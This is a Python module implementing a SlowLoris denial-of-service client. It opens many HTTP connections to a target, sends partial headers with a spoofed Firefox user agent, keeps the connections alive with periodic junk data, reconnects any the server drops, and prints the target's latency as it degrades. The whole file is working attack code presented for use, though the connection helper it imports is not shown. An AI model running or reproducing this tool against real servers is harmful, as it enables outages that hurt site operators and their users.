"""This module implements the SlowLoris client."""

import threading
import time

from .connection import LorisConnection

# Constants
DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"

class SlowLoris:
    """SlowLoris attack client."""

    def __init__(self):
        self.targets = []
        self.keepalive_thread = threading.Thread(target=self.keep_alive)
        self.keepalive_thread.setDaemon(True)
        self.keepalive_thread.start()

    def attack(self, target):
        """Starts the attack."""
        self.targets.append(target)
        print("[{}] Initializing {} connections.".format(target.host, target.count))
        # Start 'count' connections and send the initial HTTP headers.
        for i in range(target.count):
            conn = LorisConnection(target, True).send_headers(DEFAULT_USER_AGENT)
            target.connections.insert(0, conn)
            if i == target.count - 1:
                print("[{}] All connections initialized.".format(target.host))

    def stop(self):
        """Stops the attack."""
        for target in self.targets:
            print("[{}] Shutting down all connections.".format(target.host))
            for conn in target.connections:
                conn.close()

    def keep_alive(self):
        """Make sure that connections stay alive once established."""
        while True:
            time.sleep(5)
            # Iterate over all targets.
            for target in self.targets:
                # Print latest latency.
                latency = target.get_latency()
                if latency != None:
                    print("[{}] Current latency: {:.2f} ms".format(target.host, latency))
                connection_count = len(target.connections)
                # Every 10 seconds, send HTTP nonsense to prevent the connection from timing out.
                for i in range(0, connection_count):
                    try:
                        target.connections[i].keep_alive()
                    # If the server closed one of our connections,
                    # re-open the connection in its place.
                    # pylint: disable=W0702
                    except:
                        # Notify the user that the host started dropping connections
                        # if this connection was the first one being dropped.
                        if target.dropped_connections == 0:
                            print("[{}] Server started dropping connections.".format(target.host))
                        target.dropped_connections += 1
                        # Notify the user about the amount of reconnections.
                        threshold = 10
                        if target.reconnections >= threshold:
                            print("[{}] Reconnected {} dropped connections."
                                  .format(target.host, target.reconnections))
                            target.reconnections = 0
                        # Reconnect the socket.
                        conn = LorisConnection(target).send_headers(DEFAULT_USER_AGENT)
                        if conn.is_connected:
                            target.connections[i] = conn
                            target.reconnections += 1
